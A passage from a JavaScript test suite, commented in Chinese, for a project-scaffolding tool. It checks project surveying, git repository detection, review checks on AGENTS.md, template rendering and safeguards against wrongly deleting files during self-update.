    'Button.vue': '<template><button /></template>\n',
    'Card.svelte': '<div />\n',
  })
  try {
    const f = await survey(dir)
    if (f.scale.codeFiles === 0) return '.vue / .svelte 没有被算成代码文件'
    if (f.ecosystem.kinds.includes('docs-only')) return '被判成了纯文档项目'

    // 反面：真的只有 Markdown 时，还得是 docs-only。
    const docs = tmpProject({ 'README.md': '# 手册\n\n内容。\n', 'guide.md': '# 指南\n' })
    try {
      const g = await survey(docs)
      if (!g.ecosystem.kinds.includes('docs-only')) return `纯 .md 项目不再是 docs-only：${g.ecosystem.kinds.join(',')}`
      return true
    } finally { rmTree(docs) }
  } finally { rmTree(dir) }
}])

cases.push(['裸仓库判成「裸仓库」，不是「还没有版本库」', async () => {
  const dir = mkdtempSync(join(tmpdir(), 'pf-bare-'))
  try {
    spawnSync('git', ['init', '-q', '--bare', dir], { stdio: 'ignore' })
    const f = await survey(dir)
    if (f.git.isBare !== true) return `isBare 是 ${f.git.isBare}`
    if (f.git.present !== true) return '裸仓库被判成「没有版本库」'
    if (!textsOf(f.gaps).some((g) => /裸仓库/.test(g))) return 'gaps 里没有「裸仓库」这一条'
    if (textsOf(f.gaps).some((g) => /还没有版本库/.test(g))) return 'gaps 里还写着「还没有版本库」——照着它会去 git init'

    // 反面：普通仓库的 isBare 必须是假，否则每个项目都会被劝去克隆一遍。
    const normal = tmpProject({ 'README.md': '# d\n\n说明足够长。\n' })
    try {
      gitInit(normal)
      const g = await survey(normal)
      if (g.git.isBare !== false) return '普通仓库被标成了裸仓库'
      return true
    } finally { rmTree(normal) }
  } finally { rmTree(dir) }
}])

cases.push(['子目录里的独立仓库会被点名，并给出边界问题', async () => {
  const dir = tmpProject({ 'README.md': '# outer\n\n说明足够长。\n' })
  try {
    gitInit(dir)
    mkdirSync(join(dir, 'sub'))
    spawnSync('git', ['init', '-q'], { cwd: join(dir, 'sub'), stdio: 'ignore' })
    const f = await survey(dir)
    if (!(f.git.nestedRepos ?? []).includes('sub')) return `nestedRepos=${JSON.stringify(f.git.nestedRepos)}`
    if (!textsOf(f.gaps).some((g) => /独立仓库/.test(g))) return 'gaps 里没有嵌套仓库这一条'
    if (!textsOf(f.questions).some((q) => /子模块|并入/.test(q))) return '没问边界怎么处置'

    // 反面：干净的仓库不该凭空报嵌套。
    const clean = tmpProject({ 'README.md': '# d\n\n说明足够长。\n' })
    try {
      gitInit(clean)
      const g = await survey(clean)
      if ((g.git.nestedRepos ?? []).length > 0) return '干净仓库报出了嵌套仓库'
      return true
    } finally { rmTree(clean) }
  } finally { rmTree(dir) }
}])

cases.push(['清单声明了源仓库且作者匹配，角色就判得出来；没声明且无历史时提问而不是猜', async () => {
  const declared = tmpProject({
    'README.md': '# d\n\n说明足够长。\n',
    'pyproject.toml': '[project]\nname = "api"\nversion = "1.0.0"\n\n[project.urls]\nRepository = "https://github.com/acme/api"\n',
  })
  try {
    gitInit(declared)
    spawnSync('git', ['config', 'user.name', 't'], { cwd: declared, stdio: 'ignore' })
    spawnSync('git', ['config', 'user.email', 't@t.t'], { cwd: declared, stdio: 'ignore' })
    spawnSync('git', ['remote', 'add', 'origin', 'https://github.com/acme/api.git'], { cwd: declared, stdio: 'ignore' })
    const f = await survey(declared)
    if (f.ecosystem.declaredRepo !== 'acme/api') return `declaredRepo=${f.ecosystem.declaredRepo}`
    if (f.git.role !== 'maintainer') return `role=${f.git.role}（声明与 origin 一致且提交作者一致，本该是维护者）`

    // 反面：没声明且无提交作者/写权限证据时，不许猜成维护者，而且要把问题问出来。
    const undeclared = tmpProject({ 'README.md': '# d\n\n说明足够长。\n', 'main.py': 'print(1)\n' })
    try {
      spawnSync('git', ['init', '-q'], { cwd: undeclared, stdio: 'ignore' })
      spawnSync('git', ['remote', 'add', 'origin', 'https://github.com/acme/unknown.git'], { cwd: undeclared, stdio: 'ignore' })
      const g = await survey(undeclared)
      if (g.git.role !== 'undetermined') return `role=${g.git.role}（没声明源仓库却判成了别的）`
      if (!textsOf(g.questions).some((q) => /正本|源仓库/.test(q))) return '角色比不出来却没有提问'
      return true
    } finally { rmTree(undeclared) }
  } finally { rmTree(declared) }
}])

// ── W5：导航与交付体检 ──────────────────────────────────────────────

cases.push(['导航：缺文档推 docs-set，缺远端推 remote-github，skill 不推插件', async () => {
  // 正面：一份什么都没有的项目，导航必须把「写文档」与「建远端」这两件事的判据指出来。
  const bare = tmpProject({ 'README.md': '# d\n\n说明足够长。\n', 'index.js': 'console.log(1)\n' })
  try {
    const f = await survey(bare)
    const nav = f.navigation ?? []
    if (nav.length === 0) return 'JSON 里没有 navigation 字段'
    if (!nav.some((x) => x.includes('docs-set.md'))) return '缺文档却没推 docs-set.md'
    if (!nav.some((x) => x.includes('version-control.md'))) return '缺 .gitattributes / 没版本库，却没推 version-control.md'

    gitInit(bare)
    spawnSync('git', ['remote', 'add', 'origin', 'https://github.com/acme/demo.git'], { cwd: bare, stdio: 'ignore' })
    const g = await survey(bare)
    const nav2 = g.navigation ?? []
    if (!nav2.some((x) => x.includes('remote-github.md'))) return '没有 CI / PR 模板，却没推 remote-github.md'

    // JSON 与 Markdown 必须是同一份：两条路各算一遍迟早分叉。
    const md = (await runNode('survey.mjs', [bare, '--markdown'])).stdout
    for (const item of nav2) {
      const head = item.split('——')[0].replace(/^\*\*/, '').slice(0, 20)
      if (!md.includes(head)) return `Markdown 报告里少了一条导航：${head}`
    }
    return true
  } finally { rmTree(bare) }
}])

cases.push(['导航：能力目录只推 skill 那一份，不推插件与制品库', async () => {
  const skill = tmpProject({
    'SKILL.md': '---\nname: demo\ndescription: 一个示例能力目录。\n---\n\n# demo\n',
    'README.md': '# d\n\n说明足够长。\n',
  })
  try {
    const f = await survey(skill)
    const nav = f.navigation ?? []
    if (!nav.some((x) => x.includes('skill-project.md'))) return 'skill 项目没推 skill-project.md'
    // 反面：能力目录靠克隆分发，插件与制品库那两套判据对它不成立。
    if (nav.some((x) => x.includes('plugin-ecosystems.md'))) return '把插件判据推给了能力目录'
    if (nav.some((x) => x.includes('publish.md'))) return '把制品库判据推给了能力目录'

    // 另一面：真插件项目必须推插件那一份。
    const plugin = tmpProject({
      'README.md': '# p\n\n说明足够长。\n',
      'manifest.json': '{"id":"demo","minAppVersion":"1.0.0"}',
      'main.js': 'module.exports = {}\n',
    })
    try {
      const g = await survey(plugin)
      if (!(g.navigation ?? []).some((x) => x.includes('plugin-ecosystems.md'))) return '插件项目没推插件判据'
      return true
    } finally { rmTree(plugin) }
  } finally { rmTree(skill) }
}])

cases.push(['Markdown 报告带上运行环境、多生态命令与既有约定，不写成 undefined', async () => {
  const dir = tmpProject({
    'README.md': '# d\n\n说明足够长。\n',
    'package.json': '{"name":"web","version":"1.0.0","engines":{"node":">=20"},"scripts":{"test":"node --test"}}',
    'pyproject.toml': '[project]\nname = "api"\nversion = "1.0.0"\nrequires-python = ">=3.11"\n',
    'tests/test_api.py': 'def test_ok():\n    assert True\n',
  })
  try {
    const md = (await runNode('survey.mjs', [dir, '--markdown'])).stdout
    if (!/运行环境要求/.test(md)) return '报告里没有运行环境要求'
    if (!md.includes('Node >=20') && !md.includes('>=20')) return '运行环境没写出具体版本'
    if (!/按生态分开的命令/.test(md)) return '多生态项目没有逐生态列命令'
    if (!/项目已有的约定/.test(md)) return '报告里没有「已有约定」这一节'
    if (md.includes('undefined')) return '报告里出现了 undefined'

    // 反面：纯文档项目没有这些内容时，不许留空标题或 undefined。
    const docs = tmpProject({ 'README.md': '# 手册\n\n内容。\n', 'guide.md': '# 指南\n' })
    try {
      const md2 = (await runNode('survey.mjs', [docs, '--markdown'])).stdout
      if (md2.includes('undefined')) return '纯文档项目的报告里出现了 undefined'
      return true
    } finally { rmTree(docs) }
  } finally { rmTree(dir) }
}])

cases.push(['体检拦下结构坏掉的契约', async () => {
  const dir = tmpProject({ 'README.md': '# d\n\n说明足够长以通过长度检查。\n' })
  try {
    // 正面：标记不成对时，体检必须报缺——只看「有没有未填的 fill」是看不出来的。
    await runNode('compose-agents.mjs', [dir])
    const fillAll = (text) => text.replace(/^<!-- project-forge: fill [^\n]*-->$/gm, '已填写。')
    const good = fillAll(readFileSync(join(dir, 'AGENTS.md'), 'utf8'))
    writeFileSync(join(dir, 'AGENTS.md'), good)

    // 基线：一把修好的契约必须是「齐」，否则下面那条判据永远红、也证明不了什么。
    const clean = JSON.parse((await runNode('review.mjs', [dir, '--json'])).stdout)
    if (clean.results.some((x) => x.id === 'agents.broken')) return '一份完好的契约被报成了「标记不成对」'

    const broken = good.replace('<!-- project-forge: end 项目定位 -->\n', '')
    writeFileSync(join(dir, 'AGENTS.md'), broken)
    const r = JSON.parse((await runNode('review.mjs', [dir, '--json'])).stdout)
    const hit = r.results.find((x) => x.id === 'agents.broken')
    if (!hit) return '标记不成对，体检没报出来'
    if (hit.level !== 'missing') return `标记不成对报成了 ${hit.level}`
    return true
  } finally { rmTree(dir) }
}])

cases.push(['体检把系统占位署名判成缺，正常署名判成齐', async () => {
  const dir = tmpProject({ 'README.md': '# d\n\n说明足够长以通过长度检查。\n' })
  try {
    gitInit(dir)
    spawnSync('git', ['config', 'user.name', 'Administrator'], { cwd: dir, stdio: 'ignore' })
    spawnSync('git', ['config', 'user.email', 'admin@localhost'], { cwd: dir, stdio: 'ignore' })
    const r = JSON.parse((await runNode('review.mjs', [dir, '--json'])).stdout)
    const bad = r.results.find((x) => x.id === 'git.identity.placeholder')
    if (!bad) return 'Administrator / admin@localhost 被当成了合法署名'
    if (bad.level !== 'missing') return `占位署名报成了 ${bad.level}`

    // 反面：正常署名不许被误伤。
    spawnSync('git', ['config', 'user.name', 'Dev Person'], { cwd: dir, stdio: 'ignore' })
    spawnSync('git', ['config', 'user.email', 'dev@example.com'], { cwd: dir, stdio: 'ignore' })
    const r2 = JSON.parse((await runNode('review.mjs', [dir, '--json'])).stdout)
    if (r2.results.some((x) => x.id === 'git.identity.placeholder')) return '正常署名被当成了占位'
    if (!r2.results.some((x) => x.id === 'git.identity.ok')) return '正常署名没有被判成齐'
    return true
  } finally { rmTree(dir) }
}])

cases.push(['远端不在 GitHub 上时，导航给「不适用」而不是塞一份 GitHub 文档', async () => {
  const elsewhere = tmpProject({ 'README.md': '# d\n\n说明足够长。\n', 'index.js': 'console.log(1)\n' })
  const onGithub = tmpProject({ 'README.md': '# d\n\n说明足够长。\n', 'index.js': 'console.log(1)\n' })
  try {
    gitInit(elsewhere)
    spawnSync('git', ['remote', 'add', 'origin', 'https://git.example.com/team/demo.git'], { cwd: elsewhere, stdio: 'ignore' })
    gitInit(onGithub)
    spawnSync('git', ['remote', 'add', 'origin', 'https://github.com/acme/demo.git'], { cwd: onGithub, stdio: 'ignore' })

    // 正面：非 GitHub 远端时，不推那份通篇 `gh` / Actions 的文档，改成一句「不适用」。
    const a = await survey(elsewhere)
    const navA = a.navigation ?? []
    if (navA.some((x) => x.includes('remote-github.md') && x.includes('建仓库'))) {
      return '远端不在 GitHub 上，却推了通篇讲 gh 与 Actions 的文档'
    }
    if (!navA.some((x) => x.includes('远端不在 GitHub 上'))) return '既没推文档也没说明不适用，读的人会以为这项没事'

    // 反面：GitHub 远端时该推还得推，且不许误报「不适用」。
    const b = await survey(onGithub)
    const navB = b.navigation ?? []
    if (!navB.some((x) => x.includes('remote-github.md'))) return 'GitHub 远端却没推那份文档'
    if (navB.some((x) => x.includes('远端不在 GitHub 上'))) return 'GitHub 远端被误报成「不在 GitHub 上」'
    return true
  } finally { rmTree(elsewhere); rmTree(onGithub) }
}])

cases.push(['许可证不是缺口：不可发布的项目缺许可证照样能 mature', async () => {
  const dir = tmpProject({
    'README.md': '# demo\n\n私有工具，说明足够长。\n',
    'index.js': 'console.log(1)\n',
    'package.json': '{"name":"demo","version":"1.0.0","private":true}',
    '.gitattributes': '* text=auto\n',
    '.github/workflows/ci.yml': 'name: ci\non: [push]\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - run: node index.js\n',
    'AGENTS.md': [
      '# d 工程契约', '', '## 定位', '',
      '私有工具，只在本机跑，不对外发布，也不做部署与选型。', '',
      '## 构建与验证', '', '```sh', 'node index.js', '```', '',
      '## 修改规范', '', '- 先看再动；', '- 改完跑上面那条命令；', '- 不引入第三方依赖。',
    ].join('\n'),
  })
  try {
    gitInit(dir)
    spawnSync('git', ['remote', 'add', 'origin', 'https://github.com/acme/privdemo.git'], { cwd: dir, stdio: 'ignore' })
    const f = await survey(dir)
    // 正面：私有项目不放许可证是对的，它不该被算成「该修的东西」，也不该把 maturity 拖下来。
    if (textsOf(f.projectGaps).some((g) => /LICENSE/.test(g))) return '不可发布的项目缺许可证被写成了缺口'
    if (f.maturity !== 'mature') return `私有项目六项齐全却是 ${f.maturity}：${textsOf(f.gaps).join(' / ')}`
    // 该问的还是要问：放不放是使用者的事。
    if (!textsOf(f.questions).some((q) => /授权|许可证/.test(q))) return '没有把「要不要授权」问出来'

    // 反面：声明了可发布的包却没许可证时，它确实是缺口——下游合规检查会拒。
    const pub = tmpProject({
      'README.md': '# lib\n\n一个要发出去的库。\n',
      'index.js': 'module.exports = {}\n',
      'package.json': '{"name":"mylib","version":"1.0.0"}',
    })
    try {
      const g = await survey(pub)
      if (!textsOf(g.gaps).some((x) => /LICENSE/.test(x))) return '可发布的包缺许可证却没报缺口'
      return true
    } finally { rmTree(pub) }
  } finally { rmTree(dir) }
}])

cases.push(['「不进包」的目录规则只排除目录里的东西，不排除同名的普通文件', async () => {
  // `.gitattributes` 里写的是 `/docs/`，git 只排除那个目录**里面**的东西。
  // 实测过：仓库里放一个名为 docs 的普通文件，它照样进用户包。
  // 所以这条判据必须与 git 一致——它不只影响「包里有啥」，`update.mjs` 会照着它**删文件**：
  // 判错一次，用户一个叫 docs 的文件就没了，而报告说「顺手清掉了包里不该有的文件」。
  const cases = [
    { path: 'docs', expect: false, why: '一个叫 docs 的普通文件不在排除规则里' },
    { path: 'scripts/dev', expect: false, why: '裸目录名不等于目录里的东西' },
    { path: 'docs/x.md', expect: true, why: '目录里的文件确实要排除' },
    { path: 'scripts/dev/a.mjs', expect: true, why: '自用脚本目录里的文件要排除' },
    { path: 'AGENTS.md', expect: true, why: '顶层自用文件逐条列在名单里' },
    { path: 'SKILL.md', expect: false, why: '产品层的文件不许被误判' },
  ]
  const { isRepoOnlyPath } = await import('../lib/protocol.mjs')
  for (const c of cases) {
    const got = isRepoOnlyPath(c.path)
    if (got !== c.expect) return `isRepoOnlyPath('${c.path}') 是 ${got}，应为 ${c.expect}——${c.why}`
  }
  return true
}])

cases.push(['交棒扫不全时必须给 3，不许给 0', async () => {
  // 0 的意思是「干净」，而干净是不可逆动作前的通行证。任何一处「没看见」都不能发这张证：
  // 读不到的目录、读不到的文件、超大的文件、跳过不跟的符号链接——它们都可能藏着一条标记，
  // 而报告会说「一处都没有」。
  const clean = tmpProject({ 'README.md': '# d\n\n干净项目。\n' })
  const withLink = tmpProject({ 'README.md': '# d\n\n干净项目。\n' })
  try {
    // 正面：真干净就给 0。
    const ok = await runNode('handoff.mjs', [clean, '--verify'])
    if (ok.status !== 0) return `干净项目给了 ${ok.status}，应为 0：${(ok.stdout || '').trim().split('\n')[0]}`

    // 反面：有一处没扫完，就必须给 3 而不是 0。用符号链接造这个情形——
    // 链接不跟（跟进去会绕成环），但跳过它意味着那棵子树一个文件都没看。
    try {
      symlinkSync(join(withLink, 'README.md'), join(withLink, 'link.md'), 'file')
    } catch {
      return true  // 限制环境建不了链接：上面那条正面用例已经验过了
    }
    const bad = await runNode('handoff.mjs', [withLink, '--verify'])
    if (bad.status === 0) return '跳过了符号链接却仍报「干净」——那是一条没做完的检查在替不可逆动作背书'
    if (bad.status !== 3) return `没扫全给的是 ${bad.status}，应为 3（3 与 1 的区别是「没查到」与「查到了」）`
    return true
  } finally { rmTree(clean); rmTree(withLink) }
}])

cases.push(['自更新的删除判据里有「这不是源码副本」这一道', async () => {
  // `applyPackage` 会 `rmSync(recursive)` 掉 `docs/`、`scripts/dev/` 这几处。
  // 它在包副本上跑是对的（那些是「下成 Source code」时多出来的残渣），
  // 但同一个函数被复用到源码副本上时，删掉的会是这个仓库最贵的两处东西。
  //
  // 「新包里没有它」这条挡不住：目录条目在解压阶段就被丢了，顶层那几个文件本来就被
  // `export-ignore` 排除——所以 `!now.has(name)` 永远为真。
  // 唯一能挡的是「这份副本是不是只由包内容组成」。这条判据必须在，且必须在 `shouldRemove` 里。
  const src = readFileSync(join(SCRIPTS, 'update.mjs'), 'utf8')
  if (!/isPackageCopy\s*=\s*!existsSync\(join\(SKILL_ROOT, '\.git'\)\)/.test(src)) {
    return '找不到「这不是源码副本」的判据（isPackageCopy）'
  }
  const guard = /shouldRemove\s*=\s*\(name\)\s*=>\s*isPackageCopy[\s\S]{0,120}isRepoOnlyPath[\s\S]{0,80}insideSkill/.exec(src)
  if (guard === null) return 'shouldRemove 没有把 isPackageCopy 作为前置条件——一次误调用就会删掉源码副本的 docs/ 与 scripts/dev/'

  // 反面：`applyPackage` 必须在源码副本上根本不被调用（调用点在 main 那条路上有 .git 分支）。
  if (!/源码副本（目录里有 \.git），不自动更新/.test(src)) {
    return '找不到「源码副本不自动更新」那条早退——那条才是第一道闸'
  }
  return true
}])

// ── 模板渲染的静默失效 ─────────────────────────────────────────────

cases.push(['条件名拼错要报错，不许当成「条件为假」整块删掉', async () => {
  const { evaluateConditions, evaluateConditions: evalCond, renderVars } = await import('../lib/template.mjs')

  // 正面：拼错的条件名必须抛错。以前它被读成「假」，整块安静消失、退出码 0，
  // 产出一份少了整整一节却看不出任何异常的契约。
  let threw = false
  try {
    evalCond('A\n<!-- project-forge: if has-cmnds -->\nB\n<!-- project-forge: endif -->\nC\n', { 'has-commands': true })
  } catch (error) {
    threw = /未登记的条件名/.test(error.message)
  }
  if (!threw) return '拼错的条件名没有报错——那一整节会安静消失'

  // 反面：正常条件照旧，不许被误伤。
  const ok = evaluateConditions('A\n<!-- project-forge: if has-commands -->\nB\n<!-- project-forge: endif -->\nC\n', { 'has-commands': true })
  if (!ok.includes('B')) return `正常条件被误伤：${JSON.stringify(ok)}`
  const off = evaluateConditions('A\n<!-- project-forge: if has-commands -->\nB\n<!-- project-forge: endif -->\nC\n', { 'has-commands': false })
  if (off.includes('B')) return '条件为假时内容没被裁掉'

  // 第二面：形状不对的占位符必须报错。小写、带空格、带连字符都不匹配那条正则，
  // 于是既不替换也不报错，原样躺在用户的 AGENTS.md 里。
  const bad = ['{{release_doc}}', '{{ PROJECT_NAME }}', '{{PROJECT-NAME}}']
  for (const token of bad) {
    let hit = false
    try { renderVars(`x ${token} y`, { PROJECT_NAME: 'demo' }) } catch (error) { hit = /还剩这些占位符/.test(error.message) }
    if (!hit) return `${token} 这种形状的占位符没有被拦下——它会原样留在产物里`
  }

  // 反面：正常占位符照旧替换。
  if (renderVars('B {{PROJECT_NAME}}', { PROJECT_NAME: 'demo' }) !== 'B demo') return '正常占位符没被替换'
  return true
}])

cases.push(['围栏里的同名标题不算「这一节已经有了」', async () => {
  const dir = tmpProject({ 'README.md': '# d\n\n说明足够长以通过长度检查。\n' })
  try {
    await runNode('compose-agents.mjs', [dir])
    const text = readFileSync(join(dir, 'AGENTS.md'), 'utf8')
    const fillAll = (s) => s.replace(/^<!-- project-forge: fill [^\n]*-->$/gm, '已填写。')
    // 整节删掉（连标记一起），再在别处放一个**围栏里的**同名标题。
    // 围栏里的是内容不是结构——把它当成「这一节已经有了」，该补的节就永远补不上，
    // 而生成器会说「都齐了」。
    const gone = fillAll(text).replace(/<!-- project-forge: begin 高风险路径 -->[\s\S]*?<!-- project-forge: end 高风险路径 -->\n?/m, '')
    if (gone.includes('## 高风险路径')) return '夹具没删干净'
    const withFenced = gone.replace('## 取舍', '```text\n## 高风险路径\n```\n\n## 取舍')
    writeFileSync(join(dir, 'AGENTS.md'), withFenced)

    await runNode('compose-agents.mjs', [dir])
    const after = readFileSync(join(dir, 'AGENTS.md'), 'utf8')
    const real = (after.match(/^## 高风险路径/mg) ?? []).length
    if (real === 0) return '围栏里的同名标题被当成了「已有」，该补的节永远补不上'

    // 反面：再跑一遍不许插第二份。
    await runNode('compose-agents.mjs', [dir])
    const twice = (readFileSync(join(dir, 'AGENTS.md'), 'utf8').match(/^## 高风险路径/mg) ?? []).length
    if (twice > 1) return `同一节被插了两份（${twice} 份）`
    return true
  } finally { rmTree(dir) }
}])

// ── 审查栏与收尾步骤：判据本体（不是复刻一份循环） ──────────────────────
//
// 这几条 import `preflight.mjs` 里的**判据本体**来验。复刻一份循环的断言不会因为判据被
// 削弱而变红，于是「判据坏了」这件事没有任何东西看着——那正是这次要消灭的形状。
// 反面用例同样重要：判据如果会误伤正常写法，修的人第一件事是把判据放宽，而放宽之后
// 它就再也拦不住真问题了。

let preflightLib

async function loadPreflight() {
  if (preflightLib === undefined) preflightLib = await import('./preflight.mjs')
  return preflightLib
}

cases.push(['审查栏：四个字段必须排在同一段里', async () => {
  const { reviewBlockMissing } = await loadPreflight()
  const block = [
    '- **审查来源**：子代理',
    '- **逐条标准状态**：fail: 无',
    '- **故障注入记录**：删了一行，红了',
    '- **止损记录**：未触发',
  ].join('\n')
  if (reviewBlockMissing(block).length !== 0) return '四行排在一起却仍报缺'

  // 正面：删掉一行，那一块就不完整了。
  for (const drop of [0, 1, 2, 3]) {
    const lines = block.split('\n')
    lines.splice(drop, 1)
    if (reviewBlockMissing(lines.join('\n')).length === 0) return `删掉第 ${drop + 1} 行仍被判成完整`
  }

  // 正面（这是这次修的形状）：同样的四个词散落在不相邻的段落里，不算一块。
  // 「出现过就算」的判据在这里会假绿——而正文里解释这些字段时本来就会用到这些词。
  const scattered = [
    '- **审查来源**：子代理',
    '',
    '这段正文解释什么叫逐条标准状态。',
    '',
    '这段正文又提到故障注入记录。',
    '',
    '- **止损记录**：未触发',
  ].join('\n')
  if (reviewBlockMissing(scattered).length === 0) {
    return '分散在正文里的同名文字被当成了一个字段块——这正是「出现过就算」的假绿形状'
  }

  // 反面：一条都没有时，四项全报，不许说齐了。
  if (reviewBlockMissing('## 独立审查\n\n什么都没写\n').length !== 4) return '一条都没有时应当四项全缺'
  return true
}])

cases.push(['验收标准编号：可勾选那一行必须是 C 加数字', async () => {
  const { acceptanceIdMissing } = await loadPreflight()
  if (acceptanceIdMissing('- [ ] C1: 能跑通')) return '`C1` 这种形状被误判成缺编号'
  if (acceptanceIdMissing('- [ ] C12: 也是合法编号')) return '两位数字被误判'
  if (acceptanceIdMissing('- [x] C3: 勾掉的也算')) return '已勾选的那一行被误判'

  // 正面：三种常见的「看起来像编号」都不是判据认的形状。
  for (const bad of ['- [ ] 1. 能跑通', '- [ ] 第一条能跑通', '- [ ] (C) 能跑通']) {
    if (!acceptanceIdMissing(bad)) return `${bad} 这种写法被当成了合法编号`
  }

  // 反面：**别处的举例不算数。** 填写指引里本来就举了个 `C1` 的例子；按「文里出现过」判
  // 的话，清单被改成 `1.` 也照样绿——判据被那句举例削成了恒真。
  const withExample = [
    '<!-- 写法：一条一行，id 用 `C1`、`C2` 这样的短标识 -->',
    '',
    '- [ ] 1. 清单本身已经改成序号了',
  ].join('\n')
  if (!acceptanceIdMissing(withExample)) return '指引里的举例把判据撑成了恒真'
  return true
}])

cases.push(['收尾七步：齐且有序才通过，缺一步或顺序乱都要报', async () => {
  const { finishStepsState } = await loadPreflight()
  const line = (n) => `  ${n}. `
  const body = [
    line(1) + '把要写的东西写完，并纳入这次 PR：工作记录的「完成后的记录」、验收标准勾选；',
    line(2) + '合并 PR（**不勾选自动删分支**）；',
    line(3) + '回读确认 `state=MERGED`；',
    line(4) + '`git switch main && git pull`；',
    line(5) + '`git worktree remove <路径>`；',
    line(6) + '`git branch -d <分支>`；',
    line(7) + '`git push origin --delete <分支>`。',
  ]
  const wrap = (steps) => ['## 日常协作', '', '- **第四步：合并收尾与平台交互防乱码**——固定 7 步：', ...steps, '', '- **日常到此为止**'].join('\n')

  const good = finishStepsState(wrap(body))
  if (good.missing.length !== 0) return `七步齐全却报缺：${good.missing.map(String).join('、')}`
  if (good.outOfOrder) return '七步按顺序写却报顺序错'

  // 正面一：缺一步。
  const missingOne = finishStepsState(wrap(body.filter((s) => !s.includes('worktree remove'))))
  if (missingOne.missing.length !== 1) return `删掉 worktree remove 后应报缺 1 步，实际 ${missingOne.missing.length}`

  // 正面二：worktree remove 与 branch -d 对调——这是真实会犯的错，报错还会说「未合并」。
  const swapped = [...body]
  const i5 = swapped.findIndex((s) => s.includes('worktree remove'))
  const i6 = swapped.findIndex((s) => s.includes('git branch -d'))
  ;[swapped[i5], swapped[i6]] = [swapped[i6], swapped[i5]]
  const bad = finishStepsState(wrap(swapped))
  if (bad.missing.length !== 0) return '对调两步不应报缺'
  if (!bad.outOfOrder) return 'worktree remove 与 branch -d 对调没有被判成顺序错'

  // 正面三：**把「写记录」挪到合并之后**——这正是逼出多余 PR 的那个顺序。
  const recordLate = [
    body[1], body[2], body[0], body[3], body[4], body[5], body[6],
  ]
  const late = finishStepsState(wrap(recordLate))
  if (!late.outOfOrder) return '把「写记录」挪到合并之后没有被判成顺序错——那正是逼出多余 PR 的顺序'

  // 反面：整份文档里别处提到某一步，不算数——判据只看那一段的行范围。
  const noise = ['七步之外的正文里提到 git worktree remove 与 git branch -d。', '', wrap(body.slice(0, 2))].join('\n')
  const partial = finishStepsState(noise)
  if (partial.missing.length !== 5) return `正文里的提及被算成了步骤（应缺 5 步，实际 ${partial.missing.length}）`
  return true
}])

cases.push(['收尾清单没有锚点时报「七步全缺」，不是静默通过', async () => {
  const { finishStepsState } = await loadPreflight()
  // 一条判据在锚点找不到时静默返回「没问题」，等于它被削成了恒真。
  const state = finishStepsState('## 别的节\n\n- 什么也没有\n')
  if (state.missing.length !== 7) return `没有锚点时应报缺 7 步，实际 ${state.missing.length}`
  return true
}])

cases.push(['收尾步骤核对清单：三种角色一个都不能少', async () => {
  // 「个数等于列表长度」是恒真的：列表删短，两个数一起变小。所以判据按**角色**查。
  // 这条断言调的是判据本体——复刻一份循环的话，判据被改松时复制品不会红。
  const { finishSiteRolesMissing } = await loadPreflight()

  const full = ['templates/agents-project.md', 'AGENTS.md', 'references/collaboration.md']
  if (finishSiteRolesMissing(full).length !== 0) {
    return `三处都在却报缺角色：${finishSiteRolesMissing(full).join('、')}`
  }

  const cases = [
    ['删掉判据源头', full.filter((s) => s !== 'references/collaboration.md'), '判据源头'],
    ['删掉实例', full.filter((s) => s !== 'AGENTS.md'), '实例'],
    ['删掉骨架', full.filter((s) => s !== 'templates/agents-project.md'), '骨架'],
  ]
  for (const [name, sites, want] of cases) {
    const missing = finishSiteRolesMissing(sites)
    if (!missing.some((role) => role.includes(want))) {
      return `${name}后没有报缺「${want}」，实际：${missing.join('、') || '（空）'}——`
        + '那一处从此没人查，而它会一直显示「一致」'
    }
  }

  // 反面：把三处换成别的文件，角色对不上就该报，避免判据退化成「非空即过」。
  const wrong = ['README.md', 'CONTRIBUTING.md', 'SKILL.md']
  if (finishSiteRolesMissing(wrong).length !== 3) {
    return `换成不承担这三种角色的文件后，应报缺 3 个角色，实际 ${finishSiteRolesMissing(wrong).length}`
  }
  return true
}])

cases.push(['收尾七步：插入一步不该让内容下限假红', async () => {
  // 早先 `where: { step: 7 }` 写死步号，插入一步就取到错的那一步，判据以「没交代」的形式假红。
  // **假红比漏检更耗人**：它把人引去改判据，而判据本来是对的。
  // 这条断言就是给那个修法配的常驻守卫——没有它，把「按内容认步骤」改回「按编号认」，
  // 今天正好七步，取第 7 块取对了，全部门禁照样绿。
  const { finishRequiredMissing } = await loadPreflight()

  const steps = (extra) => [
    '## 日常协作', '',
    '- **第四步：合并收尾**——固定 7 步：',
    '  1. 把要写的东西写完；',
    '  2. 合并 PR；',
    '  3. 回读确认 `state=MERGED`；',
    '  4. `git switch main && git pull`；',
    '  5. `git worktree remove <路径>`；',
    '  6. `git branch -d <分支>`；',
    ...extra,
    '  删远端分支之前查两件事：远端还在不在（`git ls-remote --heads origin <分支>`）、'
      + '有没有下游堆叠 PR 以该分支为 base；两件都清了才 `git push origin --delete <分支>`。',
    '',
    '  **第 5 步之前先把要删的清单列出来问一次**：哪个 worktree、哪条本地分支、哪条远端分支。',
    '',
  ].join('\n')

  const seven = steps(['  7. '])
  if (finishRequiredMissing(seven).length !== 0) {
    return `标准七步却报缺：${finishRequiredMissing(seven).join('、')}`
  }

  // 插入一步：原来教 `git push origin --delete` 的那一步变成第 8 步。
  const eight = steps(['  7. `git status` 看一眼；', '  8. '])
  const missing = finishRequiredMissing(eight)
  if (missing.length !== 0) {
    return `插入一步后假红：${missing.join('、')}——判据按编号认步骤，不是按内容认`
  }

  // 反面：把教 `git push origin --delete` 的那一步整条删掉，必须报（说明它是真的在认内容）。
  const noPush = [
    '## 日常协作', '',
    '- **第四步：合并收尾**——固定 7 步：',
    '  1. 把要写的东西写完；',
    '  2. 合并 PR；',
    '',
    '  **第 5 步之前先把要删的清单列出来问一次**：哪个 worktree、哪条本地分支、哪条远端分支。',
    '',
  ].join('\n')
  if (!finishRequiredMissing(noPush).some((l) => l.includes('远端还在不在'))) {
    return '把教 push --delete 的那一步删掉之后没有报缺'
  }

  return true
}])

cases.push(['收尾七步：三处教人敲的命令必须一致，措辞可以不同', async () => {
  // 顺序判据看不见「同一件事的两半各写一处」：第 7 步一边写「查下游堆叠 PR」、
  // 一边写「git ls-remote」，两句话读起来都对，照着做会漏一半。这条断言盯命令，不盯措辞。
  const { finishCommandsOf } = await loadPreflight()

  const base = [
    '## 日常协作', '',
    '- **第四步：合并收尾**——固定 7 步：',
    '  1. 把要写的东西写完；',
    '  2. 合并 PR；',
    '  3. 回读确认 `state=MERGED`；',
    '  4. `git switch main && git pull`；',
